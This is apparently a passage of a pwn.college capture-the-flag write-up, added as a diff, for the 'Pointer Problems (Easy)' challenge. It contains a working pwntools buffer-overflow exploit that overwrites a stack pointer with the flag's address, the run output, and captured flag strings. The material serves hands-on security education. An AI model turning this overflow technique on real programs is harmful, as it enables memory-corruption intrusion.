@@ -2834,3 +2834,192 @@ pwn.college{IJd8sr_N9kk7rRD9zwIz4XoDVHP.0FO5IDL4ITM0EzW}
 [*] Got EOF while reading in interactive
 $ 
 ```
+
+&nbsp;
+
+## Pointer Problems (Easy)
+
+> Leverage memory corruption to leak the flag.
+
+```
+hacker@program-security~pointer-problems-easy:~$ /challenge/pointer-problems-easy 
+In this level, the flag will be loaded into the bss section of memory.
+However, at no point will this program actually print the buffer storing the flag.
+Reading flag into memory...
+The challenge() function has just been launched!
+Before we do anything, let's take a look at challenge()'s stack frame:
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffe3b8a8580 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
+| 0x00007ffe3b8a8588 (rsp+0x0008) | 68 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9768 |
+| 0x00007ffe3b8a8590 (rsp+0x0010) | 58 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9758 |
+| 0x00007ffe3b8a8598 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007ffe3b8a85a0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85a8 (rsp+0x0028) | a0 16 ef 0c 51 70 00 00 | 0x000070510cef16a0 |
+| 0x00007ffe3b8a85b0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85b8 (rsp+0x0038) | 60 40 99 09 2f 5f 00 00 | 0x00005f2f09994060 |
+| 0x00007ffe3b8a85c0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85c8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85d0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85d8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85e0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85e8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85f0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85f8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a8600 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a8608 (rsp+0x0088) | 9b 41 99 09 2f 5f 00 00 | 0x00005f2f0999419b |
+| 0x00007ffe3b8a8610 (rsp+0x0090) | a0 11 99 09 2f 5f 00 00 | 0x00005f2f099911a0 |
+| 0x00007ffe3b8a8618 (rsp+0x0098) | 00 5e 42 2f 40 62 a6 5c | 0x5ca662402f425e00 |
+| 0x00007ffe3b8a8620 (rsp+0x00a0) | 60 96 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9660 |
+| 0x00007ffe3b8a8628 (rsp+0x00a8) | d7 1b 99 09 2f 5f 00 00 | 0x00005f2f09991bd7 |
++---------------------------------+-------------------------+--------------------+
+Our stack pointer points to 0x7ffe3b8a8580, and our base pointer points to 0x7ffe3b8a8620.
+This means that we have (decimal) 22 8-byte words in our stack frame,
+including the saved base pointer and the saved return address, for a
+total of 176 bytes.
+The input buffer begins at 0x7ffe3b8a85c0, partway through the stack frame,
+("above" it in the stack are other local variables used by the function).
+Your input will be read into this buffer.
+The buffer is 65 bytes long, but the program will let you provide an arbitrarily
+large input length, and thus overflow the buffer.
+
+This challenge has a char* on the stack that will be printed after parsing your input.
+The char* is located at 0x7ffe3b8a8608, 72 bytes after the start of your input buffer.
+The flag  is located at 0x5f2f09994060.
+
+Pay close attention to how these values relate now, because they will change every time you run the program due to ASLR!
+
+Payload size: 2
+Send your payload (up to 2 bytes)!
+aa
+You sent 2 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007ffe3b8a8580 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
+| 0x00007ffe3b8a8588 (rsp+0x0008) | 68 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9768 |
+| 0x00007ffe3b8a8590 (rsp+0x0010) | 58 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9758 |
+| 0x00007ffe3b8a8598 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007ffe3b8a85a0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85a8 (rsp+0x0028) | a0 16 ef 0c 02 00 00 00 | 0x000000020cef16a0 |
+| 0x00007ffe3b8a85b0 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
+| 0x00007ffe3b8a85b8 (rsp+0x0038) | 60 40 99 09 2f 5f 00 00 | 0x00005f2f09994060 |
+| 0x00007ffe3b8a85c0 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
+| 0x00007ffe3b8a85c8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85d0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85d8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85e0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85e8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85f0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a85f8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a8600 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007ffe3b8a8608 (rsp+0x0088) | 9b 41 99 09 2f 5f 00 00 | 0x00005f2f0999419b |
+| 0x00007ffe3b8a8610 (rsp+0x0090) | a0 11 99 09 2f 5f 00 00 | 0x00005f2f099911a0 |
+| 0x00007ffe3b8a8618 (rsp+0x0098) | 00 5e 42 2f 40 62 a6 5c | 0x5ca662402f425e00 |
+| 0x00007ffe3b8a8620 (rsp+0x00a0) | 60 96 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9660 |
+| 0x00007ffe3b8a8628 (rsp+0x00a8) | d7 1b 99 09 2f 5f 00 00 | 0x00005f2f09991bd7 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7ffe3b8a85c0
+
+Calling printf() to printf with the pointer...
+The string on the stack is: This is a string in the bss!
+Goodbye!
+```
+
+This challenge prints whatever string is pointed to by the `char*` pointer.
+So in order to solve this challenge, we just need to overflow the buffer, and overwrite the `char*` pointer with the address of the flag.
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+import re
+
+p = process('/challenge/pointer-problems-easy')
+
+output = p.recvuntil(b'Payload size:')
+
+# input buffer base
+buffer_addr = int(re.search(rb'input buffer begins at (0x[0-9a-fA-F]+)', output).group(1), 16)
+# the target char* pointer on stack
+char_ptr_addr = int(re.search(rb'The char\* is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
+# the flag's address in the bss
+flag_addr = int(re.search(rb'The flag\s+is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
+
+# Calculate offset & payload_size
+offset = char_ptr_addr - buffer_addr
+payload_size = offset + 8
+
+# Log info
+log.success(f"Input Buffer     @ {hex(buffer_addr)}")
+log.success(f"Pointer          @ {hex(char_ptr_addr)}")
+log.success(f"Flag Addr        @ {hex(flag_addr)}")
+log.success(f"Offset:            {offset} bytes")
+
+# Build payload
+payload = b"A" * offset
+payload += p64(flag_addr)
+
+# Send payload size (this is what's actually asked for now)
+p.sendline(str(payload_size))
+
+# Send payload
+p.recvuntil(b'Send your payload')
+p.send(payload)
+
+p.interactive() 
+```
+
+```
+hacker@program-security~pointer-problems-easy:~$ python ~/script.py 
+[+] Starting local process '/challenge/pointer-problems-easy': pid 10061
+[+] Input Buffer     @ 0x7fff3881eef0
+[+] Pointer          @ 0x7fff3881ef38
+[+] Flag Addr        @ 0x60eb05b09060
+[+] Offset:        72 bytes
+/home/hacker/script.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
+  p.sendline(str(payload_size))
+[*] Switching to interactive mode
+ (up to 80 bytes)!
+[*] Process '/challenge/pointer-problems-easy' stopped with exit code 0 (pid 10061)
+You sent 80 bytes!
+Let's see what happened with the stack:
+
++---------------------------------+-------------------------+--------------------+
+|                  Stack location |            Data (bytes) |      Data (LE int) |
++---------------------------------+-------------------------+--------------------+
+| 0x00007fff3881eeb0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
+| 0x00007fff3881eeb8 (rsp+0x0008) | 98 00 82 38 ff 7f 00 00 | 0x00007fff38820098 |
+| 0x00007fff3881eec0 (rsp+0x0010) | 88 00 82 38 ff 7f 00 00 | 0x00007fff38820088 |
+| 0x00007fff3881eec8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
+| 0x00007fff3881eed0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
+| 0x00007fff3881eed8 (rsp+0x0028) | a0 26 8b 28 50 00 00 00 | 0x00000050288b26a0 |
+| 0x00007fff3881eee0 (rsp+0x0030) | 50 00 00 00 00 00 00 00 | 0x0000000000000050 |
+| 0x00007fff3881eee8 (rsp+0x0038) | 60 90 b0 05 eb 60 00 00 | 0x000060eb05b09060 |
+| 0x00007fff3881eef0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff3881eef8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff3881ef00 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff3881ef08 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff3881ef10 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff3881ef18 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff3881ef20 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff3881ef28 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff3881ef30 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
+| 0x00007fff3881ef38 (rsp+0x0088) | 60 90 b0 05 eb 60 00 00 | 0x000060eb05b09060 |
+| 0x00007fff3881ef40 (rsp+0x0090) | a0 61 b0 05 eb 60 00 00 | 0x000060eb05b061a0 |
+| 0x00007fff3881ef48 (rsp+0x0098) | 00 6a 41 67 8a 54 dd 39 | 0x39dd548a67416a00 |
+| 0x00007fff3881ef50 (rsp+0x00a0) | 90 ff 81 38 ff 7f 00 00 | 0x00007fff3881ff90 |
+| 0x00007fff3881ef58 (rsp+0x00a8) | d7 6b b0 05 eb 60 00 00 | 0x000060eb05b06bd7 |
++---------------------------------+-------------------------+--------------------+
+The program's memory status:
+- the input buffer starts at 0x7fff3881eef0
+
+Calling printf() to printf with the pointer...
+The string on the stack is: pwn.college{4ZdIy0Nf3F6-aPumXmZU4nCFOmO.QXygzN4EDL4ITM0EzW}
+
+Goodbye!
+[*] Got EOF while reading in interactive
+$  
+```
